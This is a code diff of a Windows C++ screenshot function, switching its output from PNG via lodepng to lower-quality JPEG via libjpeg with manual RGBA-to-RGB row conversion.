@@ -7,7 +7,7 @@
 #include "datatransmission.h"
 #include <mutex>
 #include "cipher.h"
-
+#include <jpeglib.h>
 
 
 
@@ -123,7 +123,7 @@ std::vector<unsigned char> getScreenshot()
     std::cout << cx << std::endl;
     std::cout << cy << std::endl;*/
 
-    std::vector<unsigned char> png;
+    std::vector<unsigned char> jpg;
 
 
     HDC dcScreen = GetDC(NULL);
@@ -172,14 +172,62 @@ std::vector<unsigned char> getScreenshot()
     }
 
 
-    unsigned error = lodepng::encode(png, rgba, cx, cy, LCT_RGBA, 8);
+    //unsigned error = lodepng::encode(png, rgba, cx, cy, LCT_RGBA, 8);
+
+
+    // JPEG encoding
+    jpeg_compress_struct cinfo{};
+    jpeg_error_mgr jerr{};
+
+    cinfo.err = jpeg_std_error(&jerr);
+    jpeg_create_compress(&cinfo);
+
+    unsigned char* output = nullptr;
+    unsigned long outputSize = 0;
+
+    jpeg_mem_dest(&cinfo, &output, &outputSize);
+
+    cinfo.image_width = cx;
+    cinfo.image_height = cy;
+    cinfo.input_components = 3;
+    cinfo.in_color_space = JCS_RGB;
+
+    jpeg_set_defaults(&cinfo);
+    jpeg_set_quality(&cinfo, 50, TRUE);
+
+    jpeg_start_compress(&cinfo, TRUE);
+
+    std::vector<unsigned char> row(cx * 3);
+
+    while (cinfo.next_scanline < cinfo.image_height)
+    {
+        int y = cinfo.next_scanline;
+
+        for (int i = 0; i < cx; ++i)
+        {
+            row[i * 3 + 0] = rgba[(y * cx + i) * 4 + 0];
+            row[i * 3 + 1] = rgba[(y * cx + i) * 4 + 1];
+            row[i * 3 + 2] = rgba[(y * cx + i) * 4 + 2];
+        }
+
+        JSAMPROW rowPtr = row.data();
+        jpeg_write_scanlines(&cinfo, &rowPtr, 1);
+    }
+
+    jpeg_finish_compress(&cinfo);
+
+    jpg.assign(output, output + outputSize);
+
+    free(output);
+    jpeg_destroy_compress(&cinfo);
+
 
     SelectObject(dcTarget, oldBmp);
     DeleteDC(dcTarget);
     ReleaseDC(NULL,dcScreen);
     DeleteObject(bmpTarget);
 
-    return png;
+    return jpg;
 }
 
 
